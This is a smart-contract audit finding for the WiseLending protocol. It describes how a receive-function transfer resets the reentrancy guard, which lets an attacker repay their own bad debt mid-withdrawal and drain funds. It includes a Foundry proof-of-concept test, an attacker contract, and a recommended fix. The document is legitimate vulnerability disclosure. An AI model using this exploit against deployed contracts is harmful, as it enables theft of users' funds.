[H-01] Exploitation of the receive Function to Steal Funds
Submitted by0xCiphky, also found byt0x1c
TheWiseLendingcontract incorporates a reentrancy guard through itssyncPoolmodifier, specifically within the_syncPoolBeforeCodeExecutionfunction. This guard is meant to prevent reentrancy during external calls, such as in thewithdrawExactAmountETHfunction, which processes ETH withdrawals for users.
However, there is currently a way to reset this guard, allowing for potential reentrant attacks during external calls. TheWiseLendingcontract includes areceivefunction designed to automatically redirect all ETH sent directly to it (apart from transactions from the WETH address) to a specified master address.
To forward the ETH the_sendValuefunction is used, here thesendingProgressvariable (which is used for reentrancy checks) is set to true to denote the start of the transfer process and subsequently reset to false following the completion of the call.
function_sendValue(address_recipient,uint256_amount)internal{if(address(this).balance<_amount) {revertAmountTooSmall();}sendingProgress=true;(boolsuccess,) =payable(_recipient).call{value:_amount}("");sendingProgress=false;if(success==false) {revertSendValueFailed();}}
As a result, an attacker could bypass an active reentrancy guard by initiating the receive function, effectively resetting thesendingProgressvariable. This action clears the way for an attacker to re-enter any function within the contract, even those protected by the reentrancy guard.
Having bypassed the reentrancy protection, let’s see how this vulnerability could be leveraged to steal funds from the contract.
ThewithdrawExactAmountETHfunction allows users to withdraw their deposited shares from the protocol and receive ETH, this function also contains ahealthStateCheckto ensure post withdrawal a users position is still in a healthy state. Note that this health check is done after the external call that pays out the user ETH, this will be important later on.
The protocol also implements apaybackBadDebtForTokenfunction that allows users to pay off any other users bad debt and receive a 5% incentive for doing so.
To understand how this can be exploited, consider the following example:
User A deposits 1 ETH into the protocol.User A borrows 0.5 ETH.User A callswithdrawExactAmountETHto withdraw 1 ETH.User A reenters the contract through the external call.User A resets the reentrancy guard with a direct transfer of 0.001 ETH to theWiseLendingcontract.Next, User A calls thepaybackBadDebtForTokenfunction to settle their own 0.5 ETH loan, which, due to the withdrawal, is now classified as bad debt. This not only clears the debt but also secures 0.5 ETH plus an additional incentive for User A.With the bad debt cleared, thehealthStateCheckwithin the withdrawal function is successfully passed.Consequently, User A manages to retrieve their initial 1 ETH deposit and gain an additional 0.5 ETH (plus the incentive for paying off bad debt).
Proof Of Concept
Testing is done in theWiseLendingShutdownTestfile, withContractAimported prior to executing tests:
// import ContractAimport"./ContractA.sol";// import MockErc20import"./MockContracts/MockErc20.sol";contractWiseLendingShutdownTestisTest{...ContractApubliccontractA;function_deployNewWiseLending(bool_mainnetFork)internal{...contractA=newContractA(address(FEE_MANAGER_INSTANCE),payable(address(LENDING_INSTANCE)));...}
functiontestExploitReentrancy()public{uint256depositValue=10ether;uint256borrowAmount=2ether;vm.deal(address(contractA),2ether);ORACLE_HUB_INSTANCE.setHeartBeat(WETH_ADDRESS,100days);POSITION_NFTS_INSTANCE.mintPosition();uint256nftId=POSITION_NFTS_INSTANCE.tokenOfOwnerByIndex(address(this),0);LENDING_INSTANCE.depositExactAmountETH{value:depositValue}(nftId);LENDING_INSTANCE.borrowExactAmountETH(nftId,borrowAmount);vm.prank(address(LENDING_INSTANCE));MockErc20(WETH_ADDRESS).transfer(address(FEE_MANAGER_INSTANCE),1ether);// check contractA balanceuintethBalanceStart=address(contractA).balance;uintwethBalanceStart=MockErc20(WETH_ADDRESS).balanceOf(address(contractA));//totaluinttotalBalanceStart=ethBalanceStart+wethBalanceStart;console.log("totalBalanceStart",totalBalanceStart);// deposit using contractAvm.startPrank(address(contractA));LENDING_INSTANCE.depositExactAmountETHMint{value:2ether}();vm.stopPrank();FEE_MANAGER_INSTANCE._increaseFeeTokens(WETH_ADDRESS,1ether);// withdraw weth using contractAvm.startPrank(address(contractA));LENDING_INSTANCE.withdrawExactAmount(2,WETH_ADDRESS,1ether);vm.stopPrank();// approve feemanager for 1 weth from contractAvm.startPrank(address(contractA));MockErc20(WETH_ADDRESS).approve(address(FEE_MANAGER_INSTANCE),1ether);vm.stopPrank();// borrow using contractAvm.startPrank(address(contractA));LENDING_INSTANCE.borrowExactAmount(2,WETH_ADDRESS,0.5ether);vm.stopPrank();// Payback amount//499537556593483218// withdraw using contractAvm.startPrank(address(contractA));LENDING_INSTANCE.withdrawExactAmountETH(2,0.99ether);vm.stopPrank();// check contractA balanceuintethBalanceAfter=address(contractA).balance;uintwethBalanceAfter=MockErc20(WETH_ADDRESS).balanceOf(address(contractA));//totaluinttotalBalanceAfter=ethBalanceAfter+wethBalanceAfter;console.log("totalBalanceAfter",totalBalanceAfter);uintdiff=totalBalanceAfter-totalBalanceStart;assertEq(diff>5e17,true,"ContractA profit greater than 0.5 eth");}
// SPDX-License-Identifier: -- WISE --pragmasolidity=0.8.24;// import lending and fees contractsimport"./WiseLending.sol";import"./FeeManager/FeeManager.sol";contractContractA{addresspublicfeesContract;addresspayablepubliclendingContract;addressconstantWETH_ADDRESS=0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;constructor(address_feesContract,addresspayable_lendingContract)payable{feesContract=_feesContract;lendingContract=_lendingContract;}fallback()externalpayable{if(msg.sender==lendingContract) {// send lending contract 0.01 eth to reset reentrancy flag(boolsent,bytesmemorydata) =lendingContract.call{value:0.01ether}("");//paybackBadDebtForTokenFeeManager(feesContract).paybackBadDebtForToken(2,WETH_ADDRESS,WETH_ADDRESS,499537556593483218);}}}
Impact
This vulnerability allows an attacker to illicitly withdraw funds from the contract through the outlined method. Additionally, the exploit could also work using the contract’s liquidation process instead.
Tools Used
Foundry
Recommendation
Edit the_sendValuefunction to include a reentrancy check. This ensures that the reentrancy guard is first checked, preventing attackers from exploiting this function as a reentry point. This will also not disrupt transfers from the WETH address as those don’t go through the_sendValuefunction.
function_sendValue(address_recipient,uint256_amount)internal{if(address(this).balance<_amount) {revertAmountTooSmall();}_checkReentrancy();//add heresendingProgress=true;(boolsuccess,) =payable(_recipient).call{value:_amount}("");sendingProgress=false;if(success==false) {revertSendValueFailed();}}
vonMangoldt (Wise Lending) commented via duplicate issue #40:
Good catch but we don’t consider it a high since nouserFundsrelevant state variables are changed after sending the value. And since such a call would encapsulate theborrowratecheck at the end, everything works as planned and it cannot be used to block funds or extract value or drain funds or anything. Still good to add a reentrancy check to receive function just in case.UPDATE EDIT: Ok, you also submitted a stealing of funds POC we will take a look.
vonMangoldt (Wise Lending) commented via duplicate issue #40:
Seems like this doesn’t endanger users. A user is able to borrow beyond his allowed limit. It’s basically just a flashloan without permission?
Wise Lending commented:
Mitigatedhere.